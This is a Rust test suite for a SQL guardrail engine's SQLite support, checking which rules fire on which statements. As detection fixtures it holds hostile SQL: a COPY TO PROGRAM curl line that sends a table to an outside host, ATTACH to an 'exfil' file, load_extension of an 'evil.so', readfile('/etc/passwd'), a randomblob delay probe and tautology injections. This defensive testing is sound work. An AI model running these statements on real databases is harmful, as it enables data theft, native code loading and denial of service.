// SPDX-FileCopyrightText: 2026 Vericto S.A.S.
// SPDX-License-Identifier: FSL-1.1-ALv2

//! SQLite (4.1.0, design "SQLite and Snowflake support" §3.1, §4 and §8): the
//! dialect and what its walker reads, the 31 standard rules on SQLite (design
//! §4.2: direct, variant, not applicable), the SQLite rules VERICTO-098 to
//! VERICTO-101 (§4.3), parse errors (§4.6) and `parse_error_kind`, VERICTO-087
//! identifier semantics (§4.4) and the VERICTO-085 mask rewrite (§4.5).
//!
//! The masks are pinned here by golden outputs; `sqlite_mask_equivalence.rs`
//! runs them through a real `sqlite3`.

use vericto_engine::{
    AccessPolicy, Decision, Dialect, EnforcementAction, EnforcementPolicy, EvaluationOutcome,
    ParseErrorAction, ParseErrorKind, Rule, RuleClass, RuleType, SensitiveColumn, Severity,
    evaluate, parser::parser_for,
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn rule(code: &str, severity: Severity) -> Rule {
    Rule {
        rule_id: format!("id-{code}"),
        code: code.into(),
        severity,
        default_action: EnforcementAction::Block,
        rule_type: RuleType::Standard,
        ast_condition_yaml: None,
    }
}

/// The catalogue at its published severities, the SQLite codes included.
fn catalogue() -> Vec<Rule> {
    use Severity::*;
    let mut out: Vec<Rule> = [
        ("VERICTO-001", Critical),
        ("VERICTO-003", Critical),
        ("VERICTO-010", Critical),
        ("VERICTO-011", Critical),
        ("VERICTO-012", Critical),
        ("VERICTO-030", Critical),
        ("VERICTO-042", Critical),
        ("VERICTO-080", Critical),
        ("VERICTO-081", Critical),
        ("VERICTO-086", Critical),
        ("VERICTO-090", Critical),
        ("VERICTO-002", High),
        ("VERICTO-013", High),
        ("VERICTO-015", High),
        ("VERICTO-016", High),
        ("VERICTO-017", High),
        ("VERICTO-018", High),
        ("VERICTO-019", High),
        ("VERICTO-031", High),
        ("VERICTO-033", High),
        ("VERICTO-040", High),
        ("VERICTO-070", High),
        ("VERICTO-082", High),
        ("VERICTO-083", High),
        ("VERICTO-084", High),
        ("VERICTO-085", High),
        ("VERICTO-087", High),
        ("VERICTO-050", Medium),
        ("VERICTO-051", Medium),
        ("VERICTO-061", Medium),
        ("VERICTO-060", Low),
    ]
    .iter()
    .map(|(c, s)| rule(c, *s))
    .collect();
    out.extend(sqlite_rules());
    out
}

/// VERICTO-098 to VERICTO-101 at their proposed severities.
fn sqlite_rules() -> Vec<Rule> {
    use Severity::*;
    [
        ("VERICTO-098", High),
        ("VERICTO-099", High),
        ("VERICTO-100", Critical),
        ("VERICTO-101", High),
    ]
    .iter()
    .map(|(c, s)| rule(c, *s))
    .collect()
}

fn sl(sql: &str) -> EvaluationOutcome {
    evaluate(
        sql,
        Dialect::Sqlite,
        &catalogue(),
        &EnforcementPolicy::default(),
    )
}

fn sl_with(sql: &str, policy: &EnforcementPolicy) -> EvaluationOutcome {
    evaluate(sql, Dialect::Sqlite, &catalogue(), policy)
}

/// Every code the statement violates on SQLite (default policy).
fn codes(sql: &str) -> Vec<String> {
    sl(sql)
        .violations
        .iter()
        .map(|v| v.rule_code.clone())
        .collect()
}

fn assert_fires(sql: &str, code: &str) {
    let c = codes(sql);
    assert!(
        c.iter().any(|x| x == code),
        "{code} must fire on {sql}: {c:?}"
    );
}

fn assert_quiet(sql: &str, code: &str) {
    let o = sl(sql);
    assert!(!is_parse_error(&o), "{sql} must be read: {o:?}");
    assert!(
        !o.violations.iter().any(|v| v.rule_code == code),
        "{code} must not fire on {sql}: {:?}",
        o.violations
    );
}

fn is_parse_error(o: &EvaluationOutcome) -> bool {
    o.rule_code.as_deref() == Some("VERICTO-PARSE-ERROR")
}

// ---------------------------------------------------------------------------
// The dialect
// ---------------------------------------------------------------------------

#[test]
fn sqlite_is_a_dialect() {
    for name in ["sqlite", "SQLite", "sqlite3"] {
        assert_eq!(Dialect::parse_dialect(name).unwrap(), Dialect::Sqlite);
    }
    assert_eq!(Dialect::Sqlite.as_str(), "sqlite");
    assert_eq!(
        Dialect::parse_dialect(Dialect::Sqlite.as_str()).unwrap(),
        Dialect::Sqlite
    );
    assert_eq!(parser_for(Dialect::Sqlite).dialect_name(), "sqlite");
}

/// What SQLite applications, ORMs and migration tools send is read (not a
/// parse error): UPSERT, `INSERT OR REPLACE`, `RETURNING`, `WITH RECURSIVE`,
/// window and JSON functions, every quoting style and placeholder, the
/// `PRAGMA` forms, transactions, planner hints.
#[test]
fn sqlite_statements_are_read() {
    for sql in [
        "CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT NOT NULL UNIQUE, created_at TEXT DEFAULT CURRENT_TIMESTAMP)",
        "CREATE TABLE t (id INTEGER PRIMARY KEY, body TEXT) WITHOUT ROWID",
        "CREATE TABLE t (id INTEGER PRIMARY KEY, n INT) STRICT",
        "CREATE TABLE t (a INT, b INT GENERATED ALWAYS AS (a * 2) STORED)",
        "CREATE TEMP TABLE scratch (a)",
        "CREATE VIRTUAL TABLE docs USING fts5(title, body)",
        "CREATE UNIQUE INDEX IF NOT EXISTS users_email ON users (email) WHERE email IS NOT NULL",
        "CREATE VIEW active_users AS SELECT id, email FROM users WHERE deleted_at IS NULL",
        "CREATE TRIGGER users_touch AFTER UPDATE ON users BEGIN UPDATE users SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id; END",
        "INSERT INTO users (id, email) VALUES (1, 'a@x.io') ON CONFLICT(id) DO UPDATE SET email = excluded.email",
        "INSERT INTO users (id, email) VALUES (?, ?) ON CONFLICT DO NOTHING",
        "INSERT OR REPLACE INTO kv (k, v) VALUES ('a', 1)",
        "INSERT OR IGNORE INTO kv (k, v) VALUES ('a', 1)",
        "REPLACE INTO kv (k, v) VALUES ('a', 1)",
        "UPDATE OR IGNORE kv SET v = 2 WHERE k = 'a'",
        "INSERT INTO events (kind) VALUES ('login') RETURNING id",
        "DELETE FROM sessions WHERE expires_at < unixepoch() RETURNING id",
        "WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM cnt WHERE x < 10) SELECT x FROM cnt LIMIT 10",
        "SELECT id, row_number() OVER (PARTITION BY kind ORDER BY id) AS rn FROM events LIMIT 50",
        "SELECT json_extract(payload, '$.user.id') AS uid FROM events WHERE id = 1 LIMIT 1",
        "SELECT payload ->> '$.kind' AS kind FROM events WHERE id = 1 LIMIT 1",
        "SELECT e.id, j.value FROM events e, json_each(e.payload) j WHERE e.id = 1 LIMIT 5",
        "SELECT \"Email\" FROM \"Users\" WHERE \"Id\" = ?1 LIMIT 1",
        "SELECT [email] FROM [users] WHERE [id] = :id LIMIT 1",
        "SELECT `email` FROM `users` WHERE `id` = @id LIMIT 1",
        "SELECT email FROM users WHERE id = $id LIMIT 1",
        "SELECT email FROM users INDEXED BY users_email WHERE email = ? LIMIT 1",
        "SELECT email FROM users NOT INDEXED WHERE id = 1 LIMIT 1",
        "SELECT name FROM sqlite_master WHERE type = 'table' LIMIT 100",
        "SELECT * FROM pragma_table_info('users') LIMIT 100",
        "PRAGMA foreign_keys = ON",
        "PRAGMA journal_mode = WAL",
        "PRAGMA synchronous = NORMAL",
        "PRAGMA busy_timeout = 5000",
        "PRAGMA cache_size = -2000",
        "PRAGMA table_info(users)",
        "PRAGMA main.index_list('users')",
        "PRAGMA user_version = 4",
        "PRAGMA integrity_check",
        "PRAGMA wal_checkpoint(TRUNCATE)",
        "BEGIN",
        "BEGIN IMMEDIATE TRANSACTION",
        "COMMIT",
        "END TRANSACTION",
        "ROLLBACK",
        "SAVEPOINT s1",
        "RELEASE s1",
        "ROLLBACK TO s1",
        "VACUUM",
        "ANALYZE",
        "REINDEX",
        "REINDEX users_email",
        "DETACH DATABASE reports",
        "EXPLAIN QUERY PLAN SELECT id FROM users WHERE email = ? LIMIT 1",
    ] {
        let o = sl(sql);
        assert!(!is_parse_error(&o), "{sql} must be read: {o:?}");
        assert_eq!(o.parse_error_kind(), None, "{sql}");
    }
}

// ---------------------------------------------------------------------------
// The standard rules on SQLite (design §4.2)
// ---------------------------------------------------------------------------

enum Applies {
    /// The same predicate as everywhere: (positive, negative).
    Direct(&'static str, &'static str),
    /// A SQLite reading of the rule: (positive, negative).
    Variant(&'static str, &'static str),
    /// The construct does not exist on SQLite (or SQLite rejects it): the
    /// rule never fires there.
    NotApplicable(&'static str),
}
use Applies::*;

const MATRIX: &[(&str, Applies)] = &[
    (
        "VERICTO-001",
        Direct("DELETE FROM users", "DELETE FROM users WHERE id = 1"),
    ),
    (
        "VERICTO-002",
        Direct(
            "DELETE FROM users WHERE id = 1 LIMIT 0",
            "DELETE FROM users WHERE id = 1 LIMIT 10",
        ),
    ),
    (
        "VERICTO-003",
        Variant(
            "DELETE FROM users WHERE '1abc'",
            "DELETE FROM users WHERE 'abc'",
        ),
    ),
    (
        "VERICTO-010",
        Direct("DROP TABLE users", "DROP VIEW active_users"),
    ),
    ("VERICTO-011", NotApplicable("TRUNCATE TABLE users")),
    ("VERICTO-012", NotApplicable("DROP SCHEMA analytics")),
    (
        "VERICTO-013",
        Direct("DROP INDEX users_email", "DROP INDEX IF EXISTS users_email"),
    ),
    (
        "VERICTO-015",
        Direct(
            "ALTER TABLE users DROP COLUMN legacy",
            "ALTER TABLE users ADD COLUMN nickname TEXT",
        ),
    ),
    (
        "VERICTO-016",
        Direct(
            "ALTER TABLE users RENAME TO accounts",
            "ALTER TABLE users ADD COLUMN nickname TEXT",
        ),
    ),
    (
        "VERICTO-017",
        NotApplicable("ALTER TABLE users DROP CONSTRAINT users_email_key"),
    ),
    (
        "VERICTO-018",
        NotApplicable("ALTER TABLE users ALTER COLUMN email TYPE TEXT"),
    ),
    (
        "VERICTO-019",
        Direct("DROP TRIGGER users_touch", "DROP VIEW active_users"),
    ),
    (
        "VERICTO-030",
        Direct(
            "UPDATE users SET plan = 'free'",
            "UPDATE users SET plan = 'free' WHERE id = 1",
        ),
    ),
    (
        "VERICTO-031",
        NotApplicable("WITH u AS (UPDATE users SET plan = 'x' RETURNING id) SELECT * FROM u"),
    ),
    (
        "VERICTO-033",
        NotApplicable("WITH d AS (DELETE FROM users RETURNING id) SELECT * FROM d"),
    ),
    (
        "VERICTO-040",
        Direct(
            "INSERT INTO archive SELECT * FROM users",
            "INSERT INTO archive SELECT * FROM users WHERE id = 1",
        ),
    ),
    (
        "VERICTO-042",
        Direct(
            "UPDATE users SET plan = 'free'",
            "UPDATE users SET plan = 'free' WHERE id = 1",
        ),
    ),
    (
        "VERICTO-050",
        Direct(
            "SELECT id FROM users WHERE plan = 'pro'",
            "SELECT id FROM users WHERE plan = 'pro' LIMIT 100",
        ),
    ),
    (
        "VERICTO-051",
        Direct("SELECT * FROM users", "SELECT * FROM users WHERE id = 1"),
    ),
    (
        "VERICTO-060",
        Direct(
            "INSERT INTO users VALUES (1, 'a@x.io')",
            "INSERT INTO users (id, email) VALUES (1, 'a@x.io')",
        ),
    ),
    (
        "VERICTO-061",
        Direct("(generated)", "INSERT INTO t (a) VALUES (1), (2)"),
    ),
    (
        "VERICTO-070",
        Variant(
            "SELECT 1 WHERE 1 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))",
            "SELECT hex(randomblob(16)) AS token",
        ),
    ),
    (
        "VERICTO-080",
        NotApplicable("COPY users TO PROGRAM 'curl -d @- https://x.io'"),
    ),
    (
        "VERICTO-081",
        NotApplicable("DO $$ BEGIN DELETE FROM users; END $$"),
    ),
    (
        "VERICTO-082",
        NotApplicable("GRANT SELECT ON users TO analyst"),
    ),
    (
        "VERICTO-083",
        NotApplicable("MERGE INTO users u USING staging s ON u.id = s.id WHEN MATCHED THEN DELETE"),
    ),
    (
        "VERICTO-084",
        Direct(
            "CREATE TABLE users_copy AS SELECT * FROM users",
            "CREATE TABLE users_new (id INTEGER PRIMARY KEY)",
        ),
    ),
    (
        "VERICTO-090",
        Variant(
            "SELECT id FROM users WHERE email = ? OR '1' LIMIT 1",
            "SELECT id FROM users WHERE email = ? OR 'x' LIMIT 1",
        ),
    ),
];

#[test]
fn standard_rules_matrix() {
    for (code, applies) in MATRIX {
        match applies {
            Applies::Direct(pos, neg) | Applies::Variant(pos, neg) => {
                // VERICTO-061's positive needs 10,001 tuples; generated here.
                if *code == "VERICTO-061" {
                    let rows = vec!["(1)"; 10_001].join(", ");
                    assert_fires(&format!("INSERT INTO t (a) VALUES {rows}"), code);
                    assert_quiet(neg, code);
                    continue;
                }
                assert_fires(pos, code);
                assert_quiet(neg, code);
            }
            Applies::NotApplicable(sql) => {
                // Never fires on SQLite, whether the text parses or not…
                let o = sl(sql);
                assert!(
                    !o.violations.iter().any(|v| v.rule_code == *code),
                    "{code} is n/a on SQLite: {sql} → {:?}",
                    o.violations
                );
                // …and fires on PostgreSQL, so the test proves the scoping.
                let pg = evaluate(
                    sql,
                    Dialect::Postgres,
                    &catalogue(),
                    &EnforcementPolicy::default(),
                );
                assert!(
                    pg.violations.iter().any(|v| v.rule_code == *code),
                    "{code} must fire on PostgreSQL: {sql} → {:?}",
                    pg.violations
                );
            }
        }
    }
    // 31 rules minus VERICTO-085, 086 and 087, which are not predicates over
    // the statement (085 and 087 are below; 086 is MySQL's).
    let in_matrix = MATRIX.len();
    assert_eq!(in_matrix, 28, "every predicate rule is in the matrix");
}

/// The variants, case by case.
#[test]
fn standard_rule_variants() {
    // 003 / 090: SQLite reads a text as the number its prefix spells.
    for sql in [
        "DELETE FROM users WHERE '1'",
        "DELETE FROM users WHERE ' 2.5 apples'",
        "DELETE FROM users WHERE \"1\"",
        "DELETE FROM users WHERE NOT 'abc'",
        "DELETE FROM users WHERE ('7x')",
    ] {
        assert_fires(sql, "VERICTO-003");
    }
    for sql in [
        "DELETE FROM users WHERE 'abc'",
        "DELETE FROM users WHERE '0'",
        "DELETE FROM users WHERE ''",
        "DELETE FROM users WHERE \"status\"",
        "DELETE FROM users WHERE [1]",
        "DELETE FROM users WHERE status = '1'",
    ] {
        assert_quiet(sql, "VERICTO-003");
    }
    assert_fires(
        "UPDATE users SET plan = 'x' WHERE id = 1 OR '1abc'",
        "VERICTO-090",
    );
    assert_fires("UPDATE users SET plan = 'x' WHERE '1abc'", "VERICTO-042");
    // The same text is no tautology where a string is not a number.
    let pg = evaluate(
        "DELETE FROM users WHERE id = 1 OR '1abc' = '1abc2'",
        Dialect::Postgres,
        &catalogue(),
        &EnforcementPolicy::default(),
    );
    assert!(!pg.violations.iter().any(|v| v.rule_code == "VERICTO-090"));

    // 070: the size must be a constant of 10 MB or more.
    for sql in [
        "SELECT zeroblob(1000000000)",
        "SELECT id FROM users WHERE length(randomblob(10000000)) > 0 LIMIT 1",
        "SELECT length(randomblob(2 * 5000000)) AS n",
        "SELECT 1 WHERE 1 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))",
    ] {
        assert_fires(sql, "VERICTO-070");
    }
    for sql in [
        "SELECT randomblob(16) AS token",
        "SELECT zeroblob(9999999) AS b",
        "SELECT zeroblob(?) AS b",
        "SELECT zeroblob(length(body)) AS b FROM docs WHERE id = 1 LIMIT 1",
    ] {
        assert_quiet(sql, "VERICTO-070");
    }
    // The probe is SQLite's: elsewhere randomblob is any function.
    let my = evaluate(
        "SELECT zeroblob(1000000000)",
        Dialect::Mysql,
        &catalogue(),
        &EnforcementPolicy::default(),
    );
    assert!(!my.violations.iter().any(|v| v.rule_code == "VERICTO-070"));

    // A trigger's body runs on every matching write: its statements are walked.
    let o = sl("CREATE TRIGGER purge AFTER INSERT ON audit BEGIN DELETE FROM audit_old; END");
    assert_eq!(o.rule_code.as_deref(), Some("VERICTO-001"), "{o:?}");
    assert!(
        o.ast_node_path
            .as_deref()
            .is_some_and(|p| p.starts_with("CreateTriggerStmt purge > DeleteStmt")),
        "{o:?}"
    );
    assert_quiet(
        "CREATE TRIGGER touch AFTER UPDATE ON users BEGIN UPDATE users SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id; END",
        "VERICTO-042",
    );
}

/// Statements that evaluate `{f}` (a `randomblob(N)` / `zeroblob(N)` call)
/// outside the projection, the `WHERE` root and call arguments, where 4.1.0
/// did not look (4.1.1). Every one is valid SQLite (checked with sqlite3 3.51:
/// `EXPLAIN` over the schema in `PROBE_SCHEMA`).
const PROBE_SHAPES: &[&str] = &[
    "SELECT 1 WHERE {f} IS NOT NULL",
    "SELECT 1 WHERE {f} IS NULL",
    "SELECT 1 WHERE {f} NOTNULL",
    "SELECT {f} IS NULL AS x",
    "SELECT CASE WHEN {f} IS NULL THEN 1 ELSE 0 END AS x",
    "SELECT CASE {f} WHEN x'00' THEN 1 END AS x",
    "SELECT CASE WHEN id = 1 THEN 0 ELSE {f} END AS x FROM users WHERE id = 1 LIMIT 1",
    "SELECT 1 WHERE NOT ({f} IS NULL)",
    "SELECT id FROM users WHERE id = 1 AND NOT (length({f}) = 0) LIMIT 1",
    "SELECT 1 WHERE (length({f}) IS NOT NULL)",
    "SELECT CAST(length({f}) AS TEXT) AS n",
    "SELECT 1 WHERE length({f}) BETWEEN 1 AND 2",
    "SELECT 1 WHERE hex({f}) LIKE 'A%'",
    "SELECT 1 WHERE 1 IN (length({f}), 2)",
    "SELECT 1 WHERE length({f}) IN (1, 2)",
    "SELECT 1 WHERE 1 IN (SELECT length({f}))",
    "SELECT 1 WHERE EXISTS (SELECT 1 WHERE {f} IS NULL)",
    "SELECT (SELECT {f} IS NULL) AS x",
    "SELECT x FROM (SELECT {f} IS NULL AS x) LIMIT 1",
    "WITH p AS (SELECT {f} IS NULL AS x) SELECT x FROM p LIMIT 1",
    "WITH p AS (SELECT 1 AS x) SELECT x FROM p WHERE x IN (SELECT length({f})) LIMIT 1",
    "SELECT 1 UNION ALL SELECT {f} IS NULL",
    "SELECT id FROM users ORDER BY length({f}) LIMIT 1",
    "SELECT count(*) AS n FROM users GROUP BY length({f})",
    "SELECT count(*) AS n FROM users GROUP BY id HAVING length({f}) > 0",
    "SELECT id FROM users LIMIT length({f})",
    "SELECT id FROM users LIMIT 1 OFFSET length({f})",
    "SELECT u.id FROM users u JOIN docs d ON d.id = u.id AND {f} IS NOT NULL LIMIT 1",
    "SELECT sum(id) OVER (ORDER BY length({f})) AS s FROM users LIMIT 1",
    "SELECT count(*) FILTER (WHERE {f} IS NULL) AS n FROM users",
    "SELECT value FROM json_each(json_array(length({f}))) LIMIT 1",
    "INSERT INTO docs (body) SELECT {f} IS NULL",
    "INSERT INTO docs (body) SELECT body FROM docs WHERE {f} IS NULL LIMIT 1",
    "INSERT INTO docs (body) VALUES ({f})",
    "INSERT INTO docs (id, body) VALUES (1, 'x') ON CONFLICT (id) DO UPDATE SET body = {f}",
    "INSERT INTO docs (id, body) VALUES (1, 'x') ON CONFLICT (id) DO UPDATE SET body = 'y' WHERE {f} IS NULL",
    "INSERT INTO docs (body) VALUES ('x') RETURNING length({f})",
    "UPDATE docs SET body = {f} WHERE id = 1",
    "UPDATE docs SET body = CASE WHEN {f} IS NULL THEN 'a' END WHERE id = 1",
    "UPDATE docs SET body = 'x' WHERE id = 1 RETURNING {f} IS NULL",
    "UPDATE docs SET body = s.x FROM (SELECT {f} IS NULL AS x) AS s WHERE docs.id = 1",
    "DELETE FROM docs WHERE {f} IS NULL",
    "DELETE FROM docs WHERE id = 1 RETURNING {f} IS NULL",
    "CREATE TABLE copy AS SELECT {f} IS NULL AS x",
    "CREATE TRIGGER g AFTER INSERT ON docs BEGIN UPDATE docs SET body = {f} WHERE id = NEW.id; END",
    "CREATE TRIGGER g AFTER INSERT ON docs BEGIN SELECT 1 WHERE {f} IS NOT NULL; END",
    "CREATE TRIGGER g AFTER INSERT ON docs BEGIN INSERT INTO users (id) VALUES (length({f})); END",
    "CREATE TRIGGER g AFTER INSERT ON docs WHEN {f} IS NOT NULL BEGIN SELECT 1; END",
];

/// The tables `PROBE_SHAPES` name, for checking them with sqlite3.
#[allow(dead_code)]
const PROBE_SCHEMA: &str = "CREATE TABLE users (id INTEGER PRIMARY KEY); CREATE TABLE docs (id INTEGER PRIMARY KEY, body BLOB);";

#[test]
fn vericto_070_probe_wherever_sqlite_evaluates_it() {
    // A constant N of 10 MB or more is the probe, in any clause that runs.
    for shape in PROBE_SHAPES {
        for f in [
            "randomblob(100000000)",
            "zeroblob(100000000)",
            "RANDOMBLOB(500000000/2)",
            "zeroblob(10000000)",
        ] {
            let sql = shape.replace("{f}", f);
            assert_fires(&sql, "VERICTO-070");
            let o = sl(&sql);
            assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
        }
    }
    // Below 10 MB, or a size that is not a constant (a bind parameter, a
    // call), is no probe, as before: the rule reads constants only. (A
    // trigger cannot hold a bind parameter.)
    for shape in PROBE_SHAPES {
        for f in [
            "randomblob(16)",
            "zeroblob(9999999)",
            "randomblob(abs(100000000))",
            "zeroblob(abs(random() % 16))",
            "zeroblob(?)",
            "randomblob(:n)",
        ] {
            if f.contains(['?', ':']) && shape.starts_with("CREATE TRIGGER") {
                continue;
            }
            assert_quiet(&shape.replace("{f}", f), "VERICTO-070");
        }
    }
    // The probe is SQLite's: elsewhere randomblob is any function, and the
    // other dialects walk exactly what they walked in 4.1.0.
    for dialect in [
        Dialect::Mysql,
        Dialect::Oracle,
        Dialect::MsSql,
        Dialect::Snowflake,
        Dialect::Postgres,
    ] {
        for shape in PROBE_SHAPES {
            let sql = shape.replace("{f}", "zeroblob(1000000000)");
            let o = evaluate(&sql, dialect, &catalogue(), &EnforcementPolicy::default());
            assert!(
                !o.violations.iter().any(|v| v.rule_code == "VERICTO-070"),
                "{dialect:?} {sql}: {o:?}"
            );
        }
    }
}

#[test]
fn complete_walk_reaches_the_other_rules() {
    // A sleep() an extension defines is still a sleep-family name.
    assert_fires("SELECT 1 WHERE sleep(5) IS NULL", "VERICTO-070");
    // A subquery under IN / EXISTS / ORDER BY is walked like any other: its
    // SELECT is recorded (VERICTO-051), its calls too (custom rules).
    assert_fires(
        "SELECT id FROM users WHERE id IN (SELECT * FROM docs) LIMIT 1",
        "VERICTO-051",
    );
    assert_fires(
        "SELECT id FROM users WHERE EXISTS (SELECT * FROM docs) LIMIT 1",
        "VERICTO-051",
    );
    // A trigger's WHEN is walked before its body; the body's paths stay
    // prefixed with the trigger.
    let o = sl(
        "CREATE TRIGGER g AFTER INSERT ON docs BEGIN UPDATE docs SET body = zeroblob(1000000000) WHERE id = NEW.id; END",
    );
    assert_eq!(o.rule_code.as_deref(), Some("VERICTO-070"), "{o:?}");
    // Benign statements with the same shapes stay quiet.
    for sql in [
        "SELECT id FROM users WHERE id IN (SELECT id FROM docs WHERE id = 1) LIMIT 1",
        "UPDATE docs SET body = zeroblob(16) WHERE id = 1",
        "INSERT INTO docs (id, body) VALUES (1, randomblob(16)) ON CONFLICT (id) DO UPDATE SET body = excluded.body",
        "SELECT id FROM users ORDER BY lower(id) LIMIT 1",
    ] {
        let o = sl(sql);
        assert!(o.violations.is_empty(), "{sql}: {o:?}");
    }
}

// ---------------------------------------------------------------------------
// The SQLite rules (design §4.3)
// ---------------------------------------------------------------------------

#[test]
fn sqlite_rules_positive_and_negative() {
    // VERICTO-098: ATTACH, any form.
    for sql in [
        "ATTACH DATABASE '/tmp/exfil.db' AS exfil",
        "ATTACH 'other.db' AS other",
        "attach database ':memory:' as mem",
        "ATTACH DATABASE 'enc.db' AS enc KEY 'secret'",
    ] {
        assert_fires(sql, "VERICTO-098");
    }
    for sql in ["DETACH DATABASE reports", "DETACH reports"] {
        assert_quiet(sql, "VERICTO-098");
    }

    // VERICTO-099: safety pragmas, whichever grammar reads them.
    for sql in [
        "PRAGMA writable_schema = ON",
        "PRAGMA writable_schema = 1",
        "PRAGMA writable_schema = RESET",
        "PRAGMA trusted_schema = ON",
        "PRAGMA trusted_schema = 'yes'",
        "PRAGMA foreign_keys = OFF",
        "PRAGMA foreign_keys = 0",
        "PRAGMA foreign_keys(false)",
        "PRAGMA main.foreign_keys = no",
        "PRAGMA ignore_check_constraints = ON",
        "PRAGMA journal_mode = OFF",
        "PRAGMA synchronous = OFF",
        "PRAGMA synchronous = 0",
        "PRAGMA cell_size_check = OFF",
        "PRAGMA query_only = OFF",
        "PRAGMA schema_version = 42",
        "PRAGMA temp_store_directory = '/tmp/x'",
        "PRAGMA data_store_directory = 'C:\\data'",
    ] {
        assert_fires(sql, "VERICTO-099");
    }
    for sql in [
        "PRAGMA foreign_keys = ON",
        "PRAGMA foreign_keys",
        "PRAGMA writable_schema",
        "PRAGMA journal_mode = WAL",
        "PRAGMA journal_mode = DELETE",
        "PRAGMA synchronous = NORMAL",
        "PRAGMA synchronous = FULL",
        "PRAGMA trusted_schema = OFF",
        "PRAGMA query_only = ON",
        "PRAGMA user_version = 3",
        "PRAGMA table_info(users)",
        "PRAGMA cache_size = -2000",
        "PRAGMA defer_foreign_keys = ON",
        "PRAGMA optimize",
    ] {
        assert_quiet(sql, "VERICTO-099");
    }

    // VERICTO-100: native code and file functions, in any clause.
    for sql in [
        "SELECT load_extension('/tmp/evil.so')",
        "SELECT load_extension('/tmp/evil.so', 'sqlite3_evil_init')",
        "INSERT INTO t (a) VALUES (load_extension('x'))",
        "UPDATE t SET a = \"LOAD_EXTENSION\"('x') WHERE id = 1",
        "SELECT id FROM t WHERE id = 1 ORDER BY load_extension('x') LIMIT 1",
        "SELECT fts3_tokenizer('simple', x'4141414141414141')",
        "SELECT writefile('/tmp/dump.csv', data) FROM t WHERE id = 1 LIMIT 1",
        "SELECT readfile('/etc/passwd')",
        "SELECT edit('x', 'vi')",
    ] {
        assert_fires(sql, "VERICTO-100");
    }
    for sql in [
        "SELECT 'load_extension(x)' AS s",
        "SELECT id FROM t /* load_extension('x') */ WHERE id = 1 LIMIT 1",
        "SELECT load_extension_count FROM stats WHERE id = 1 LIMIT 1",
        "SELECT json_extract(payload, '$.id') AS id FROM events WHERE id = 1 LIMIT 1",
    ] {
        assert_quiet(sql, "VERICTO-100");
    }

    // VERICTO-101: VACUUM INTO.
    for sql in [
        "VACUUM INTO '/tmp/copy.db'",
        "VACUUM main INTO 'backup.db'",
        "vacuum into 'x.db';",
        "VACUUM INTO lower('/TMP/X.DB')",
    ] {
        assert_fires(sql, "VERICTO-101");
    }
    for sql in ["VACUUM", "VACUUM main"] {
        assert_quiet(sql, "VERICTO-101");
    }
}

/// The examples the control plane seeds (migration 091): each `example_bad`
/// is blocked by its own code, each `example_good` allowed, with the whole
/// catalogue and the default policy.
#[test]
fn catalogue_examples() {
    for (code, bad, good) in [
        (
            "VERICTO-098",
            "ATTACH DATABASE '/tmp/exfil.db' AS exfil;",
            "DETACH DATABASE reports;",
        ),
        (
            "VERICTO-099",
            "PRAGMA writable_schema = ON;",
            "PRAGMA foreign_keys = ON;",
        ),
        (
            "VERICTO-100",
            "SELECT load_extension('/tmp/evil.so');",
            "SELECT json_extract(payload, '$.id') AS id FROM events WHERE id = 1 LIMIT 1;",
        ),
        ("VERICTO-101", "VACUUM INTO '/tmp/copy.db';", "VACUUM;"),
    ] {
        let o = sl(bad);
        assert_eq!(o.decision, Decision::Block, "{bad}: {o:?}");
        assert_eq!(o.rule_code.as_deref(), Some(code), "{bad}: {o:?}");
        let o = sl(good);
        assert_eq!(o.decision, Decision::Allow, "{good}: {o:?}");
    }
}

/// The SQLite codes read only what the SQLite parser records.
#[test]
fn sqlite_rules_never_fire_on_other_dialects() {
    for sql in [
        "ATTACH DATABASE 'x.db' AS x",
        "PRAGMA writable_schema = 1",
        "PRAGMA foreign_keys = 0",
        "SELECT load_extension('/tmp/evil.so')",
        "VACUUM",
    ] {
        for d in [
            Dialect::Postgres,
            Dialect::Mysql,
            Dialect::Oracle,
            Dialect::MsSql,
            Dialect::Snowflake,
        ] {
            let o = evaluate(sql, d, &sqlite_rules(), &EnforcementPolicy::default());
            assert!(o.violations.is_empty(), "{sql} on {d:?}: {o:?}");
        }
    }
}

#[test]
fn sqlite_rule_classes() {
    for code in ["VERICTO-098", "VERICTO-100", "VERICTO-101"] {
        assert_eq!(RuleClass::for_code(code), RuleClass::Security, "{code}");
    }
    assert_eq!(
        RuleClass::for_code("VERICTO-099"),
        RuleClass::SchemaMigration
    );
    // A CI channel softens a safety pragma (a migration's table rebuild), not
    // ATTACH, native code or VACUUM INTO.
    let ci = EnforcementPolicy {
        schema_migration_cap: Some(EnforcementAction::Flag),
        ..EnforcementPolicy::default()
    };
    assert_eq!(
        sl_with("PRAGMA foreign_keys = OFF", &ci).decision,
        Decision::Flag
    );
    for sql in [
        "ATTACH 'x.db' AS x",
        "SELECT load_extension('x')",
        "VACUUM INTO 'x.db'",
    ] {
        assert_eq!(sl_with(sql, &ci).decision, Decision::Block, "{sql}");
    }
}

// ---------------------------------------------------------------------------
// Parse errors (design §4.6)
// ---------------------------------------------------------------------------

const UNPARSEABLE: &str = "SELECT id FROM users WHERE a IS NOT b";

fn tagged(policy: EnforcementPolicy) -> EnforcementPolicy {
    EnforcementPolicy {
        sensitive_columns: serde_json::from_str(
            r#"[{"table":"customers","column":"email","policy":"mask"}]"#,
        )
        .unwrap(),
        ..policy
    }
}

fn enforced_agent(policy: EnforcementPolicy) -> EnforcementPolicy {
    EnforcementPolicy {
        access_policy: Some(serde_json::from_str(r#"{"mode":"enforce","entries":[]}"#).unwrap()),
        ..policy
    }
}

/// Unparseable SQLite text resolves like on every dialect: flagged by
/// default, blocked when the host asks for it or a protection forces it.
#[test]
fn sqlite_parse_errors_follow_the_host_policy() {
    let monitor = EnforcementPolicy {
        monitor_mode: true,
        ..EnforcementPolicy::default()
    };
    let ci = EnforcementPolicy {
        schema_migration_cap: Some(EnforcementAction::Flag),
        ..EnforcementPolicy::default()
    };
    let closed = EnforcementPolicy {
        parse_error: ParseErrorAction::Block,
